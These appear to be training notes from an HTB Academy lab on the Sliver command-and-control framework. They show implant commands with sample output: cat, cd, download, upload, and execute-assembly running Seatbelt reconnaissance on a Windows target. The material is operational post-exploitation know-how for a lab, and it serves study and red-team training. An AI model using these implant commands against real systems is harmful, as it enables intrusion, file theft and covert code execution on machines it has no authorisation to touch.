## Basic Command usage
#### Command - cat

Similar to the one in Linux, the `cat` command allows us to display/print the contents of a file; to get a brief description about its usage.

```sh
sliver (http-session) > cat --help
```

```sh
sliver (http-session) > cat academy.txt

Hello HTB Academy!
```

![](Commands%20and%20Tools%20Introduction-20261104-124319.png)
#### Command - cd

```sh
sliver (http-beacon) > help cd
```

The command takes in a directiory for the implant to switch to.

```sh
sliver (http-beacon) > cd C:\Users

[*] C:\Users
```
## Tools
#### Command - download

The `download` command, as its name suggests, is a command (tool) that allows us to download files from the target machine to ours. The usage is quite similar to that of [Evil-WinRM](https://github.com/Hackplayers/evil-winrm).

```sh
sliver (http-session) > download --help
```

```sh
sliver (http-session) > download Pictures

[*] Wrote 291 bytes (1 file successfully, 0 files unsuccessfully) to /home/htb-ac-1008/http-session_download_Pictures_1711090807.tar.gz
```
#### Command - upload

`upload` allows file upload from a local machine to a remote target machine.

```sh
sliver (http-session) > help upload
```

```sh
sliver (http-session) > upload academy.txt C:\\Users\\eric\\Desktop\\academy.txt

[*] Wrote file to C:\Users\eric\Desktop\academy.txt

sliver (http-session) > ls C:\\Users\\eric\\Desktop\\academy.txt

C:\Users\eric\Desktop (1 item, 19 B)
====================================
-rw-rw-rw-  academy.txt  19 B  Fri Mar 22 07:20:34 -0700 2024
```

We can use also a single forward slash instead of escaping them.

```sh
sliver (http-session) > upload academy.txt C:/Users/eric/Desktop/academy.txt

[*] Wrote file to C:\Users\eric\Desktop\academy.txt
```
#### Command - execute-assembly

`execute-assembly` allows us to run .NET binaries on the target machine, without uploading them. However, one caveat that `execute-assembly` has is it will spawn a child process.

```sh
sliver (http-session) > help execute-assembly
```

By default `execute-assembly` will spawn a `notepad.exe` process when we run any .NET binary.

```sh
sliver (http-session) > execute-assembly Seatbelt.exe -group=system

[*] Output:

<SNIP>

====== WSUS ======

  UseWUServer                    : False
  Server                         : 
  AlternateServer                : 
  StatisticsServer               : 



[*] Completed collection in 29.151 seconds
```

The same behavior of spawning a `notepad.exe` process can be seen also if we use the armory equivalent extension of `Seatbelt`.

```sh
sliver (http-session) > seatbelt -- -group=system

[*] seatbelt output:

<SNIP>

====== WSUS ======

  UseWUServer                    : False
  Server                         : 
  AlternateServer                : 
  StatisticsServer               : 



[*] Completed collection in 29.316 seconds
```
